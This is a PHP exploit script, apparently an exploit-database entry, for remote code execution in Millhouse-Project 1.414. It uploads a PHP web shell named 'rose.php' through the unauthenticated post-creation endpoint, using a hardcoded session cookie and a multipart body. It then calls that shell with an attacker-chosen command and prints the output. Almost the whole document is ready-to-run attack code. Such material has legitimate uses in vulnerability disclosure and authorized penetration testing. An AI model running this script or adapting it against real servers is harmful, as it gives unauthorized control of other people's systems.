<?php
/*
Exploit Title: thrsrossi Millhouse-Project 1.414 - Remote Code Execution
Date: 12/05/2023
Exploit Author: Chokri Hammedi
Vendor Homepage: https://github.com/thrsrossi/Millhouse-Project
Software Link: https://github.com/thrsrossi/Millhouse-Project.git
Version: 1.414
Tested on: Debian
CVE: N/A
*/


$options = getopt('u:c:');

if(!isset($options['u'], $options['c']))
die("\033[1;32m \n Millhouse Remote Code Execution \n Author: Chokri Hammedi
\n \n Usage : php exploit.php -u http://target.org/ -c whoami\n\n
\033[0m\n
\n");

$target     =  $options['u'];

$command    =  $options['c'];

$url = $target . '/includes/add_post_sql.php';


$post = '------WebKitFormBoundaryzlHN0BEvvaJsDgh8
Content-Disposition: form-data; name="title"

helloworld
------WebKitFormBoundaryzlHN0BEvvaJsDgh8
Content-Disposition: form-data; name="description"

<p>sdsdsds</p>
------WebKitFormBoundaryzlHN0BEvvaJsDgh8
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryzlHN0BEvvaJsDgh8
Content-Disposition: form-data; name="category"

1
------WebKitFormBoundaryzlHN0BEvvaJsDgh8
Content-Disposition: form-data; name="image"; filename="rose.php"
Content-Type: application/x-php

<?php
$shell = shell_exec("' . $command . '");
echo $shell;
?>

------WebKitFormBoundaryzlHN0BEvvaJsDgh8--
';

$headers = array(
    'Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryzlHN0BEvvaJsDgh8',
    'Cookie: PHPSESSID=rose1337',
);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);

$response = curl_exec($ch);
curl_close($ch);

// execute command

$shell = "{$target}/images/rose.php?cmd=" . urlencode($command);
$ch = curl_init($shell);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$exec_shell = curl_exec($ch);
curl_close($ch);
echo "\033[1;32m \n".$exec_shell . "\033[0m\n \n";

?>